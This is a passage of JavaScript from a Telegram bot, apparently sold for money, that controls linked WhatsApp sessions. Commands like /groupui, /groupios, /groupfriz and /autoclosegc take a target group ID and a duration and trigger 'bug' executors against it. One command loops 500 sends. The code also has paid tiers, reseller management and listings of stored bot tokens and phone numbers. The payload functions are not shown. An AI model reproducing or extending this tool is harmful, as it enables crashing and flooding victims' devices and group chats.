  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /groupui input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /groupui: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID and duration.\nExample: /groupui 120363047626537xxx@g.us 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /groupui: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a group JID and duration in hours.\nExample: /groupui 120363047626537xxx@g.us 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /groupui: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /groupui: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /groupui: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

      await xeonUiKingGpExecutor(durationHours, rawTarget, userNumber, chatId, botInstance);

  } catch (error) {
    console.error(`Error in /groupui for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /groupui: ${error.message}`);
  }
});

botInstance.onText(/\/groupios(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /groupios raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /groupios input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /groupios: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID and duration.\nExample: /groupios 120363047626537xxx@g.us 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /groupios: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a group JID and duration in hours.\nExample: /groupios 120363047626537xxx@g.us 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /groupios: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /groupios: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /groupios: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

      await xeonIosGroupInitiator(durationHours, rawTarget, userNumber, chatId, botInstance);

  } catch (error) {
    console.error(`Error in /groupios for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /groupios: ${error.message}`);
  }
});

botInstance.onText(/\/groupfriz(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /groupfriz raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /groupfriz input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /groupfriz: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID and duration.\nExample: /groupfriz 120363047626537xxx@g.us 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /groupfriz: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a group JID and duration in hours.\nExample: /groupfriz 120363047626537xxx@g.us 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /groupfriz: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /groupfriz: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /groupfriz: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

      await xeonGroupDocExecutor(durationHours, rawTarget, userNumber, chatId, botInstance);

  } catch (error) {
    console.error(`Error in /groupfriz for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /groupfriz: ${error.message}`);
  }
});

botInstance.onText(/\/autoclosegc(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /autoclosegc raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /autoclosegc input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /autoclosegc: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID and duration.\nExample: /autoclosegc 120363047626537xxx@g.us 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /autoclosegc: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a group JID and duration in hours.\nExample: /autoclosegc 120363047626537xxx@g.us 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /autoclosegc: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /autoclosegc: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /autoclosegc: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

      await xeonAndroidInvisibleKingGroupExecutor(durationHours, rawTarget, userNumber, chatId, botInstance);

  } catch (error) {
    console.error(`Error in /autoclosegc for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /autoclosegc: ${error.message}`);
  }
});

botInstance.onText(/\/xxxbetagcxxx(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /xbetagc raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /xbetagc input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /xbetagc: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID.\nExample: /xgroup 120363047626537xxx@g.us\n\nTo get group ID, use /listgc or /group-id <link>');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /xbetagc: rawTarget = "${rawTarget}"`);

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /xbetagc: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /xbetagc: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sent bvg to group...
│ Target: ${rawTarget.replace('@g.us', '')}
│ From: ${userNumber}
└────────────────────────┘`,
    });

    for (let i = 0; i < 500; i++) {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        return;
      }
      try {
      await xbetagcios(rawTarget, userNumber, chatId, botInstance);
      await xbetagcandroid(rawTarget, userNumber, chatId, botInstance);
      await sleep(1000);
      } catch (error) {
        break; // Exit the loop on error to prevent spamming
      }
    }

  } catch (error) {
    console.error(`Error in /xbetagc for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /xbetagc: ${error.message}`);
  }
});

// Command handler for /groupid
botInstance.onText(/\/gmgroupid(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /groupid raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /groupid input: match[1] = "${match[1]}"`);

  const inviteLink = match[1] ? match[1].trim() : '';
  await getGroupIdFromInviteLink(inviteLink, userNumber, chatId, botInstance);
});

  botInstance.onText(/\/deltoken(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (msg.chat.type !== 'private') return;

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;
  
  if (!CONFIG.owner.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only Developer can use this command.');
    }

  const userBot = getUserBot(botInstance);

  if (!match[1]) {
    return userBot.sendMessage(chatId, '❌ Provide a bot token.\nExample: /deltoken 1234567890:AAH...');
  }
  
  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  const botToken = match[1].trim();
  const userIdWithToken = Object.keys(db.botTokens).find(
    (userId) => db.botTokens[userId] === botToken
  );

  if (!userIdWithToken) {
    return userBot.sendMessage(chatId, '❌ Token not found.');
  }

  delete db.botTokens[userIdWithToken];
  saveJson('./database/bot_tokens.json', db.botTokens);

  const botKey = Array.from(botInstances.keys()).find((key) => {
    const bot = botInstances.get(key);
    return bot.token === botToken;
  });

  if (botKey) {
    botInstances.get(botKey).stopPolling();
    botInstances.delete(botKey);
    console.log(`Stopped and removed bot: ${botKey}`);
  }

  await userBot.sendMessage(chatId, `✅ Bot token removed successfully.`);
});

  botInstance.onText(/\/addtoken(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (msg.chat.type !== 'private') return;

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);
  
  if (!CONFIG.owner.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only Developer can use this command.');
    }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  if (!match[1]) {
    return userBot.sendMessage(chatId, '❌ Provide a valid Telegram bot token.\nExample: /addtoken 1234567890:AAH1a2b3c4d5e6g7h8i9j0k');
  }

  const botToken = match[1].trim();

  if (!/^\d{9,10}:[A-Za-z0-9_-]{35}$/.test(botToken)) {
    return userBot.sendMessage(chatId, '❌ Invalid bot token format. It should be like: 1234567890:AAH1a2b3c4d5f6g7i8j0k1l2m5n6p');
  }

  if (Object.values(db.botTokens).includes(botToken)) {
    return userBot.sendMessage(chatId, '❌ This bot token is already added.');
  }

  try {
    const newBot = new TelegramBot(botToken, { polling: true });
    const botInfo = await newBot.getMe();

    if (!botInfo || !botInfo.id) {
      return userBot.sendMessage(chatId, '❌ Invalid bot token. Could not authenticate with Telegram.');
    }

    const botKey = `@${botInfo.username}`;
    botInstances.set(botKey, newBot);
    db.botTokens[senderId] = botToken; // Associate token with senderId
    saveJson('./database/bot_tokens.json', db.botTokens);
    console.log(`Bot token added for @${botInfo.username} by user ${senderId}`);
    registerCommandHandlers(newBot, false);
    await userBot.sendMessage(chatId, `✅ Bot token added successfully. Bot @${botInfo.username} is now active and can be used by all users.`);
  } catch (error) {
    console.error(`Error in /addtoken for ${senderId}: ${error.message}`);
    await userBot.sendMessage(chatId, `❌ Failed to add bot token: ${error.message}`);
  }
});

  botInstance.onText(/\/addprem(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only owners and resellers can use this command.');
    }

    if (!match[1]) {
      return userBot.sendMessage(chatId, '❌ Provide a user ID.\nExample: /addprem 123456789');
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
    if (isNaN(userId)) {
      return userBot.sendMessage(chatId, '❌ Invalid user ID.');
    }

    if (db.bannedUsers.includes(userId)) {
  await userBot.sendMessage(chatId, `Cannot add user ${userId} to premium — this user is permanently banned from the bot. Please contact owner ${CONFIG.usertele}`);
} else if (!db.premiumUsers.includes(userId)) {
  db.premiumUsers.push(userId);
  saveJson('./database/premium.json', db.premiumUsers);
  console.log(`${senderId} added ${userId} to premium`);
  await userBot.sendMessage(chatId, `User ${userId} added to premium.`);
} else {
  await userBot.sendMessage(chatId, `User ${userId} is already premium.`);
}
  });

  botInstance.onText(/\/delprem(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only owners and resellers can use this command.');
    }

    if (!match[1]) {
      return userBot.sendMessage(chatId, '❌ Provide a user ID.\nExample: /delprem 123456789');
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
    if (isNaN(userId)) {
      return userBot.sendMessage(chatId, '❌ Invalid user ID.');
    }

    if (db.premiumUsers.includes(userId)) {
      db.premiumUsers = db.premiumUsers.filter((id) => id !== userId);
      saveJson('./database/premium.json', db.premiumUsers);
      console.log(`${senderId} removed ${userId} from premium`);
      await userBot.sendMessage(chatId, `✅ User ${userId} removed from premium.`);
    } else {
      await userBot.sendMessage(chatId, `❌ User ${userId} is not premium.`);
    }
  });

botInstance.onText(/\/listprem(?:\\s(.+))?$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (msg.chat.type !== 'private') return;
  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;
  const userBot = getUserBot(botInstance);
  if (!CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId)) return userBot.sendMessage(chatId, 'Only owners and resellers can use this command.');
  if (db.premiumUsers.length === 0) return userBot.sendMessage(chatId, 'No premium users found.');

  const parts = [];
  let text = `<b>┌──────┤ Premium Users List ├──────┐</b>\n\nTotal: <b>${db.premiumUsers.length}</b>\n\n`;
  let count = 0;

  for (const userId of db.premiumUsers) {
    count++;
    const userLink = await formatUserLink(userBot, userId);

    const line = `${count}. ${userLink}\n   <b>ID:</b> <code>${userId}</code>\n\n`;

    if (text.length + line.length > 3900) {
      text += '<b>└────────────────────────┘</b>';
      parts.push(text);
      text = `<b>┌──────┤ Premium Users List (Part ${parts.length + 2}) ├──────┐</b>\n\n`;
    }
    text += line;
  }
  text += '<b>└────────────────────────┘</b>';
  parts.push(text);

  for (const p of parts) {
    await userBot.sendMessage(chatId, p, { parse_mode: 'HTML', disable_web_page_preview: true });
    await sleep(300);
  }
});

  botInstance.onText(/\/addresell(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!CONFIG.owner.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only Developer can use this command.');
    }

    if (!match[1]) {
      return userBot.sendMessage(chatId, '❌ Provide a user ID.\nExample: /addresell 123456789');
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
    if (isNaN(userId)) {
      return userBot.sendMessage(chatId, '❌ Invalid user ID.');
    }
    
    if (db.bannedUsers.includes(userId)) {
    return userBot.sendMessage(chatId, `Cannot add user ${userId} as reseller — this user is permanently banned from the bot. Please contact owner ${CONFIG.usertele}`);
  }

    if (!db.OwnerUsers.includes(userId)) {
      db.OwnerUsers.push(userId);
      saveJson('./database/Owner.json', db.OwnerUsers);
      console.log(`${senderId} added ${userId} to resellers`);
      await userBot.sendMessage(chatId, `✅ User ${userId} added as reseller.`);
    } else {
      await userBot.sendMessage(chatId, `❌ User ${userId} is already a reseller.`);
    }
  });

  botInstance.onText(/\/delresell(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!CONFIG.owner.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only developer can use this command.');
    }

    if (!match[1]) {
      return userBot.sendMessage(chatId, '❌ Provide a user ID.\nExample: /delresell 123456789');
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
    if (isNaN(userId)) {
      return userBot.sendMessage(chatId, '❌ Invalid user ID.');
    }

    if (db.OwnerUsers.includes(userId)) {
      db.OwnerUsers = db.OwnerUsers.filter((id) => id !== userId);
      saveJson('./database/Owner.json', db.OwnerUsers);
      console.log(`${senderId} removed ${userId} from resellers`);
      await userBot.sendMessage(chatId, `✅ User ${userId} removed from resellers.`);
    } else {
      await userBot.sendMessage(chatId, `❌ User ${userId} is not a reseller.`);
    }
  });

botInstance.onText(/\/listresell(?:\\s(.+))?$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (msg.chat.type !== 'private') return;
  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;
  const userBot = getUserBot(botInstance);
  if (!CONFIG.owner.includes(senderId)) return userBot.sendMessage(chatId, 'Only Developer can use this command.');
  if (db.OwnerUsers.length === 0) return userBot.sendMessage(chatId, 'No resellers found.');

  const parts = [];
  let text = `<b>┌──────┤ Resellers List ├──────┐</b>\n\nTotal: <b>${db.OwnerUsers.length}</b>\n\n`;
  let count = 0;

  for (const userId of db.OwnerUsers) {
    count++;
    const userLink = await formatUserLink(userBot, userId);

    const line = `${count}. ${userLink}\n   <b>ID:</b> <code>${userId}</code>\n\n`;

    if (text.length + line.length > 3900) {
      text += '<b>└────────────────────────┘</b>';
      parts.push(text);
      text = `<b>┌──────┤ Resellers List (Part ${parts.length + 2}) ├──────┐</b>\n\n`;
    }
    text += line;
  }
  text += '<b>└────────────────────────┘</b>';
  parts.push(text);

  for (const p of parts) {
    await userBot.sendMessage(chatId, p, { parse_mode: 'HTML', disable_web_page_preview: true });
    await sleep(300);
  }
});

botInstance.onText(/\/listuser(?:\\s(.+))?$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (msg.chat.type !== 'private') return;
  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;
  const userBot = getUserBot(botInstance);
  if (!CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId)) return userBot.sendMessage(chatId, 'Only owners can use this command.');
  if (Object.keys(db.userNumbers).length === 0) return userBot.sendMessage(chatId, 'No users have connected WhatsApp numbers.');

  const parts = [];
  let text = `<b>┌──────┤ Connected Users List ├──────┐</b>\n\nTotal: <b>${Object.keys(db.userNumbers).length}</b>\n\n`;
  let count = 0;

  for (const [userId, number] of Object.entries(db.userNumbers)) {
    count++;
    const userLink = await formatUserLink(userBot, userId);
    const num = number ? escapeHtml(number) : 'Not paired';

    const line = `${count}. ${userLink}\n` +
                 `   <b>ID:</b> <code>${userId}</code>\n` +
                 `   <b>Number:</b> <code>${num}</code>\n\n`;

    if (text.length + line.length > 3900) {
      text += '<b>└────────────────────────┘</b>';
      parts.push(text);
      text = `<b>┌──────┤ Connected Users List (Part ${parts.length + 2}) ├──────┐</b>\n\n`;
    }
    text += line;
  }
  text += '<b>└────────────────────────┘</b>';
  parts.push(text);

  for (const p of parts) {
    await userBot.sendMessage(chatId, p, { parse_mode: 'HTML', disable_web_page_preview: true });
    await sleep(300);
  }
});

botInstance.onText(/\/listtoken(?:\\s(.+))?$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (msg.chat.type !== 'private') return;
  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;
  const userBot = getUserBot(botInstance);
  if (!CONFIG.owner.includes(senderId)) return userBot.sendMessage(chatId, 'Only owners can use this command.');
  if (Object.keys(db.botTokens).length === 0) return userBot.sendMessage(chatId, 'No bot tokens have been added.');

  const parts = [];
  let text = `<b>┌──────┤ Bot Tokens List ├──────┐</b>\n\nTotal Tokens: <b>${Object.keys(db.botTokens).length}</b>\n\n`;
  let count = 0;

  for (const [userId, token] of Object.entries(db.botTokens)) {
    count++;
    const userLink = await formatUserLink(userBot, userId);
    let botName = 'Invalid Token';
    try {
      const temp = new TelegramBot(token, { polling: false });
      const me = await temp.getMe();
      botName = me.username ? `@${me.username}` : 'Invalid Token';
    } catch {}
    botName = escapeHtml(botName);

    const line = `${count}. ${userLink}\n` +
                 `   <b>ID:</b> <code>${userId}</code>\n` +
                 `   <b>Bot:</b> ${botName}\n` +
                 `   <b>Token:</b> <code>${escapeHtml(token)}</code>\n\n`;

    if (text.length + line.length > 3900) {
      text += '<b>└────────────────────────┘</b>';
      parts.push(text);
      text = `<b>┌──────┤ Bot Tokens List (Part ${parts.length + 2}) ├──────┐</b>\n\n`;
    }
    text += line;
  }
  text += '<b>└────────────────────────┘</b>';
  parts.push(text);

  for (const p of parts) {
    await userBot.sendMessage(chatId, p, { parse_mode: 'HTML', disable_web_page_preview: true });
    await sleep(300);
  }
